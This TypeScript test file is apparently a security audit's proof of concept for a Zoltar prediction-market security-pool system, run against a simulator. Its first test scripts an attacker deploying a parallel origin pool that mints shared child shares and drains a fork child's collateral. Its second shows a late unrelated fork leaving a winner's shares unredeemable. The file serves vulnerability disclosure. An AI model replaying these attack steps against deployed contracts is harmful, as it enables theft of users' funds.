import { describe, test } from 'bun:test'
import { usePeripheralsForkMigrationFixture } from './peripherals/fixture'
import { addRepToMigrationBalance, splitMigrationRep } from '../testSupport/simulator/utils/contracts/zoltar'
import { deployOriginSecurityPool } from '../testSupport/simulator/utils/contracts/deployPeripherals'

describe('Solidity audit proof of concept', () => {
	const fixture = usePeripheralsForkMigrationFixture()

	test('a parallel origin pool can mint shared child shares and drain repaired fork collateral', async () => {
		const {
			approveToken,
			addressString,
			balanceOfShares,
			client,
			createCompleteSet,
			createWriteClient,
			DAY,
			depositRep,
			finalizeTruthAuction,
			GENESIS_REPUTATION_TOKEN,
			genesisUniverse,
			getChildUniverseId,
			getCompleteSetCollateralAmount,
			getEthRaiseCap,
			getETHBalance,
			getQuestionEndDate,
			getRepToken,
			getRepTokenAddress,
			getSecurityPoolAddresses,
			getShareTokenSupply,
			getSystemState,
			getTotalTheoreticalSupply,
			getZoltarAddress,
			manipulatePriceOracle,
			manipulatePriceOracleAndPerformOperation,
			migrateRepToZoltar,
			migrateShares,
			migrateVault,
			mockWindow,
			OperationType,
			PRICE_PRECISION,
			QuestionOutcome,
			redeemCompleteSet,
			securityMultiplier,
			securityPoolAddresses,
			startTruthAuction,
			strictEqualTypeSafe,
			SystemState,
			TEST_ADDRESSES,
			triggerOwnGameFork,
			questionId,
		} = fixture

		const parentAllowance = 20n * 10n ** 18n
		await manipulatePriceOracleAndPerformOperation(client, mockWindow, securityPoolAddresses.priceOracleManagerAndOperatorQueuer, OperationType.SetSecurityBondsAllowance, client.account.address, parentAllowance)
		const endTime = await getQuestionEndDate(client, questionId)
		await mockWindow.setTime(endTime - 1n)

		const migratingHolder = createWriteClient(mockWindow, TEST_ADDRESSES[2], 0)
		const passiveHolder = createWriteClient(mockWindow, TEST_ADDRESSES[3], 0)
		const migratedCash = 4n * 10n ** 18n
		const passiveCash = 6n * 10n ** 18n
		await createCompleteSet(migratingHolder, securityPoolAddresses.securityPool, migratedCash)
		await createCompleteSet(passiveHolder, securityPoolAddresses.securityPool, passiveCash)

		const forkThreshold = (await getTotalTheoreticalSupply(client, await getRepToken(client, securityPoolAddresses.securityPool))) / 20n / securityMultiplier
		await depositRep(client, securityPoolAddresses.securityPool, 2n * forkThreshold)
		await manipulatePriceOracle(client, mockWindow, securityPoolAddresses.priceOracleManagerAndOperatorQueuer)
		await triggerOwnGameFork(client, securityPoolAddresses.securityPool)
		await migrateRepToZoltar(client, securityPoolAddresses.securityPool, [QuestionOutcome.Yes])
		await migrateVault(client, securityPoolAddresses.securityPool, QuestionOutcome.Yes)
		for (const outcome of [QuestionOutcome.Invalid, QuestionOutcome.Yes, QuestionOutcome.No]) {
			await migrateShares(migratingHolder, securityPoolAddresses.shareToken, genesisUniverse, outcome, [QuestionOutcome.Yes])
		}

		const yesUniverse = getChildUniverseId(genesisUniverse, QuestionOutcome.Yes)
		const forkChild = getSecurityPoolAddresses(securityPoolAddresses.securityPool, yesUniverse, questionId, securityMultiplier)
		await mockWindow.advanceTime(8n * 7n * DAY + DAY)
		await startTruthAuction(client, forkChild.securityPool)
		if ((await getSystemState(client, forkChild.securityPool)) === SystemState.ForkTruthAuction) {
			const repairContribution = await getEthRaiseCap(client, forkChild.truthAuction)
			await mockWindow.advanceTime(7n * DAY + DAY)
			await finalizeTruthAuction(client, forkChild.securityPool, repairContribution)
		}

		strictEqualTypeSafe(await getSystemState(client, forkChild.securityPool), SystemState.Operational, 'fork child should be operational')
		const forkChildCollateral = await getCompleteSetCollateralAmount(client, forkChild.securityPool)
		const forkChildSupply = await getShareTokenSupply(client, forkChild.securityPool)
		strictEqualTypeSafe(forkChildSupply, migratedCash * PRICE_PRECISION, 'fork child should price only the migrated share fraction')
		fixture.assert.ok(forkChildCollateral > migratedCash, 'truth repair should leave the partial migrated supply backed above par')

		const attacker = createWriteClient(mockWindow, TEST_ADDRESSES[4], 0)
		await deployOriginSecurityPool(attacker, yesUniverse, questionId, securityMultiplier)
		const parallelOrigin = getSecurityPoolAddresses(addressString(0n), yesUniverse, questionId, securityMultiplier)
		strictEqualTypeSafe(parallelOrigin.shareToken, forkChild.shareToken, 'both pools should use the same ERC-1155 contract')

		const attackerRep = 200n * 10n ** 18n
		await approveToken(attacker, addressString(GENESIS_REPUTATION_TOKEN), getZoltarAddress())
		await addRepToMigrationBalance(attacker, genesisUniverse, attackerRep)
		await splitMigrationRep(attacker, genesisUniverse, attackerRep, [QuestionOutcome.Yes])
		await approveToken(attacker, getRepTokenAddress(yesUniverse), parallelOrigin.securityPool)
		await depositRep(attacker, parallelOrigin.securityPool, attackerRep / 2n)
		await manipulatePriceOracleAndPerformOperation(attacker, mockWindow, parallelOrigin.priceOracleManagerAndOperatorQueuer, OperationType.SetSecurityBondsAllowance, attacker.account.address, migratedCash)

		const attackerBalanceBefore = await getETHBalance(client, attacker.account.address)
		await createCompleteSet(attacker, parallelOrigin.securityPool, migratedCash)
		const attackerShares = await balanceOfShares(attacker, forkChild.shareToken, yesUniverse, attacker.account.address)
		strictEqualTypeSafe(attackerShares[0], forkChildSupply, 'parallel origin should mint a full fork-child supply of shared tokens')
		await redeemCompleteSet(attacker, forkChild.securityPool, forkChildSupply)
		const attackerProfit = (await getETHBalance(client, attacker.account.address)) - attackerBalanceBefore

		strictEqualTypeSafe(attackerProfit, forkChildCollateral - migratedCash, 'attacker should extract every wei of fork collateral above the mint cost')
		strictEqualTypeSafe(await getCompleteSetCollateralAmount(client, forkChild.securityPool), 0n, 'fork child collateral should be drained')
		strictEqualTypeSafe(await getShareTokenSupply(client, forkChild.securityPool), 0n, 'fork child internal share supply should be depleted')
	})

	test('a late unrelated universe fork lets a finalized winner irreversibly migrate away redeemable shares', async () => {
		const {
			approveToken,
			addressString,
			balanceOfShares,
			client,
			createCompleteSet,
			createQuestion,
			createWriteClient,
			finalizeQuestionAsYesWithoutFork,
			GENESIS_REPUTATION_TOKEN,
			genesisUniverse,
			getChildUniverseId,
			getCompleteSetCollateralAmount,
			getETHBalance,
			getQuestionId,
			getShareTokenSupply,
			getSystemState,
			getZoltarAddress,
			initiateSecurityPoolFork,
			manipulatePriceOracleAndPerformOperation,
			migrateShares,
			mockWindow,
			OperationType,
			questionData,
			QuestionOutcome,
			redeemShares,
			securityPoolAddresses,
			strictEqualTypeSafe,
			SystemState,
			TEST_ADDRESSES,
			outcomes,
			forkUniverse,
		} = fixture

		await manipulatePriceOracleAndPerformOperation(client, mockWindow, securityPoolAddresses.priceOracleManagerAndOperatorQueuer, OperationType.SetSecurityBondsAllowance, client.account.address, 10n * 10n ** 18n)
		const winner = createWriteClient(mockWindow, TEST_ADDRESSES[2], 0)
		const winningCash = 5n * 10n ** 18n
		await createCompleteSet(winner, securityPoolAddresses.securityPool, winningCash)
		await finalizeQuestionAsYesWithoutFork()

		const forkCaller = createWriteClient(mockWindow, TEST_ADDRESSES[1], 0)
		const lateForkQuestionData = {
			...questionData,
			title: 'audit late unrelated fork',
			endTime: await mockWindow.getTime(),
		}
		const lateForkQuestionId = getQuestionId(lateForkQuestionData, outcomes)
		await createQuestion(forkCaller, lateForkQuestionData, outcomes)
		await approveToken(forkCaller, addressString(GENESIS_REPUTATION_TOKEN), getZoltarAddress())
		await forkUniverse(forkCaller, genesisUniverse, lateForkQuestionId)

		strictEqualTypeSafe(await getSystemState(client, securityPoolAddresses.securityPool), SystemState.Operational, 'finalized parent remains operational')
		await migrateShares(winner, securityPoolAddresses.shareToken, genesisUniverse, QuestionOutcome.Yes, [QuestionOutcome.Yes])
		const yesUniverse = getChildUniverseId(genesisUniverse, QuestionOutcome.Yes)
		const parentBalances = await balanceOfShares(winner, securityPoolAddresses.shareToken, genesisUniverse, winner.account.address)
		const childBalances = await balanceOfShares(winner, securityPoolAddresses.shareToken, yesUniverse, winner.account.address)
		strictEqualTypeSafe(parentBalances[1], 0n, 'migration should burn all redeemable parent winner shares')
		strictEqualTypeSafe(childBalances[1], winningCash * 10n ** 18n, 'migration should mint child shares without a collateralized child pool')

		await fixture.assert.rejects(initiateSecurityPoolFork(client, securityPoolAddresses.securityPool), /Resolved/)
		const parentCollateralBefore = await getCompleteSetCollateralAmount(client, securityPoolAddresses.securityPool)
		const winnerEthBefore = await getETHBalance(client, winner.account.address)
		await redeemShares(winner, securityPoolAddresses.securityPool)
		strictEqualTypeSafe(await getETHBalance(client, winner.account.address), winnerEthBefore, 'parent redemption should pay zero after migration')
		const parentCollateralAfter = await getCompleteSetCollateralAmount(client, securityPoolAddresses.securityPool)
		fixture.assert.ok(parentCollateralAfter > 0n && parentCollateralAfter <= parentCollateralBefore, 'unpaid ETH should remain in parent collateral after fee accrual')
		strictEqualTypeSafe(await getShareTokenSupply(client, securityPoolAddresses.securityPool), 0n, 'a zero-balance redemption should collapse parent accounting to the migrated actual winner supply')
	})
})
